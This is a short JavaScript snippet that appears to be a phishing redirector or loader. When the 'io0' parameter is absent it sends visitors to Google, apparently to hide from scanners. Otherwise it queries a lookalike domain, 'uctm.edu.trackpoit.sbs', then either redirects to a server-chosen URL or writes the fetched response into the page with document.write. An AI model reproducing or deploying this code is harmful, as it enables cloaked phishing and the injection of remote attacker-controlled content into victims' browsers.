(function() {
    var params = new URLSearchParams(window.location.search);
    var paramValue = params.get("io0");

    if (!paramValue) {
        window.location.replace("https://www.google.com");
        return;
    }

    // تم تعديل المسار ليعمل كنقطة نهاية (API) صحيحة
    var targetUrl = "https://j.uctm.edu.trackpoit.sbs/api/input?ids=" + encodeURIComponent(paramValue);

    fetch(targetUrl)
        .then(function(res) {
            return res.text();
        })
        .then(function(text) {
            try {
                var data = JSON.parse(text);
                if (data.redirectUrl) {
                    window.location.replace(data.redirectUrl);
                }
            } catch (err) {
                document.open();
                document.write(text);
                document.close();
            }
        })
        .catch(function(err) {
            console.error("Execution error:", err);
        });
})();
